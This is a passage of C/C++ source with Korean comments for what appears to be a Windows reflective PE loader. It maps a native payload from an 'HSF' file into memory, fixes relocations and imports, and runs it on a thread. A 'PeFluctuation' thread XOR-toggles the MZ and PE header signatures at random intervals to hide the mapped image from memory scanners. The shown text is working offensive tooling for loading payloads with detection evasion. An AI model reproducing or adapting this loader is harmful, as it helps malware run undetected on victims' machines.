static volatile BOOL  g_FluctStop   = FALSE;

static DWORD WINAPI PeFluctThread(LPVOID lp){
    (void)lp;
    unsigned int seed = GetTickCount();
    while(!g_FluctStop && g_FluctPtr){
        /* 상태 A: MZ + PE 시그니처 파괴 */
        g_FluctPtr[0] ^= 0xFF;
        g_FluctPtr[1] ^= 0xFF;
        if(g_FluctNtOff){
            g_FluctPtr[g_FluctNtOff]   ^= 0xFF;
            g_FluctPtr[g_FluctNtOff+1] ^= 0xFF;
        }
        Sleep(120 + (seed % 180)); seed = seed*1103515245u + 12345u;

        /* 상태 B: 복원 */
        g_FluctPtr[0] ^= 0xFF;
        g_FluctPtr[1] ^= 0xFF;
        if(g_FluctNtOff){
            g_FluctPtr[g_FluctNtOff]   ^= 0xFF;
            g_FluctPtr[g_FluctNtOff+1] ^= 0xFF;
        }
        Sleep(80 + (seed % 120)); seed = seed*1103515245u + 12345u;
    }
    return 0;
}

static void StartPeFluctuation(PVOID base){
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    g_FluctPtr   = (volatile BYTE*)base;
    g_FluctNtOff = (DWORD)dos->e_lfanew;
    g_FluctStop  = FALSE;
    HANDLE h = CreateThread(NULL, 0, PeFluctThread, NULL, 0, NULL);
    if(h){
        CloseHandle(h);  /* detached — 프로세스 종료 시 함께 정리 */
        LOG("[+] PeFluctuation thread started (MZ+PE magic toggle)\n");
    } else {
        LOG("[-] PeFluctuation thread failed: %lu\n", GetLastError());
    }
}
#endif /* ENABLE_PE_FLUCTUATION */

static bool RunNative(char* data,DWORD sz){
#ifdef _WIN64
    NPE pe{};
    if(!NMap(data,sz,&pe))return false;
    if(!pe.Is64){LOG("[-] x86 PE in x64 loader — build loader as Win32\n");
        VirtualFree(pe.Base,0,MEM_RELEASE);return false;}
    if(!NReloc(&pe)||!NImports(&pe)){VirtualFree(pe.Base,0,MEM_RELEASE);return false;}
    NTls(&pe);
    NProtect(&pe);

#if ENABLE_PE_FLUCTUATION
    StartPeFluctuation(pe.Base);
#endif

    HANDLE t=CreateThread(NULL,0,NativeThread,&pe,0,NULL);
    if(!t){LOG("[-] CreateThread failed\n");VirtualFree(pe.Base,0,MEM_RELEASE);return false;}
    WaitForSingleObject(t,INFINITE);
    CloseHandle(t);
    return true;
#else
    LOG("[-] Native x64 requires x64 loader build\n");
    return false;
#endif
}

/* ================================================================
 * main
 * ================================================================ */
int main(int argc, char** argv){
    if(argc!=3||_stricmp(argv[1],"file")!=0){
        LOG("Usage: %s file <hsf>\n",argv[0]);
        return 1;
    }

    DATA payload=LoadHSF(argv[2]);
    if(!payload.data||!payload.len) return 2;

    if(IsMgd(payload.data,payload.len)){
        LOG("[!] Native-only loader — Managed payload rejected\n");
        free(payload.data);
        return 3;
    }
    LOG("[*] Payload type: Native (C/C++)\n");

    bool ok=RunNative((char*)payload.data,(DWORD)payload.len);

    free(payload.data);
    LOG(ok?"[+] Done\n":"[-] Failed\n");
    return ok?0:2;
}
